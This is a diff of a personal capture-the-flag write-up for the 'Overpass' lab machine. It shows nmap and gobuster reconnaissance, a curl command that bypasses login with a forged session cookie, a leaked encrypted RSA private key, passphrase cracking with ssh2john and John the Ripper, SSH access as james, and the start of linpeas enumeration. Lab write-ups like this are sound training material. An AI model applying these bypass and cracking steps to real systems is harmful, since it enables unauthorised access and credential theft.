@@ -1,10 +1,12 @@
 # OVERPASS
  
+> Aaron Aguilar, Feb 09, 2023
 
- > Aaron Aguilar, Feb 09, 2023
 
+# Hack the machine and get the flag in user.txt
 
- # 1. Hack the machine and get the flag in user.txt
+### As usual we are going for a reconnaisance using nmap 
+
 ```
 22/tcp open  ssh     syn-ack ttl 63
 | ssh-hostkey: 
@@ -17,14 +19,14 @@
 |_http-title: Overpass
 | http-methods: 
 |_  Supported Methods: GET HEAD POST OPTIONS
-
+```
 
 using gobuster I was able to find this page
 
-> http://10.10.146.29/admin/
+>- http://10.10.146.29/admin/
 
-looking at the source code in the login.js it sesms like we can just log in using a cookies
-
+### looking at the source code in the login.js it sesms like we can just log in using a cookies
+```
 }
 async function login() {
     const usernameBox = document.querySelector("#username");
@@ -42,11 +44,12 @@ async function login() {
         window.location = "/admin"
     }
 }
+```
+### honestly, I feel lost so I looked up the write ups and thankful that mr.john hammond uploaded his writeup for this... I followed his syntax up until he was able to get the rsa and then I stopped watching
 
-> honestly, I feel lost so I looked up the write ups and thankful that mr.john hammond uploaded his writeup for this... I followed his syntax up until he was able to get the rsa and then I stopped watching
-
-> by copying his syntax I was able to get the RSA_KEY
---$ curl http://10.10.146.29/admin/ --cookie "SessionToken='anything'"
+### by copying his syntax I was able to get the RSA_KEY
+```
+$ curl http://10.10.146.29/admin/ --cookie "SessionToken='anything'"
 
             <pre>-----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -78,13 +81,15 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
 -----END RSA PRIVATE KEY-----</pre>
-
-> pasted the rsa nano rsa_id  
+```
+### Cracking with JTR
+```
 --$ nano rsa_id  
 --$ ssh2john rsa_id                
 rsa_id:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b
----$ nano for_john.txt
----$ john for_john.txt      
+ 
+$ nano for_john.txt
+$ john for_john.txt      
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -98,9 +103,12 @@ Proceeding with incremental:ASCII
 james13          (rsa_id)     
 1g 0:00:00:02 DONE 3/3 (2023-02-09 00:22) 0.3412g/s 483449p/s 483449c/s 483449C/s james13
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
-> since I have James password now I can now try to ssh
-─$ chmod 600 rsa_id   
+Session completed.
+```
+
+### since I have James password now I can now try to ssh
+```
+chmod 600 rsa_id   
 └─$ ssh -i rsa_id james@10.10.146.29 -p 22
 Enter passphrase for key 'rsa_id': 
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
@@ -123,17 +131,15 @@ To Do:
 > Ask Paradox how he got the automated build script working and where the builds go.
   They're not updating on the website
 james@overpass-prod:~$ [2023-02-09T00:43:11] Synchronising notes from Evernote.
+```
 
-
+### Privileged Escalation
 
 ```
 
-#  2. Escalate your privileges and get the flag in root.txt
-```
-
-> now I dont know what to do again, I was trying to check for any other clue but I dont get it..
+>- now I dont know what to do again, I was trying to check for any other clue but I dont get it..
 so I sent linpeas to enumerate the machine
-> on my kali box I shared my directory
+>- on my kali box I shared my directory
 
 └─$ sudo cp linpeas.sh /var/www/html
 [sudo] password for aaron: 
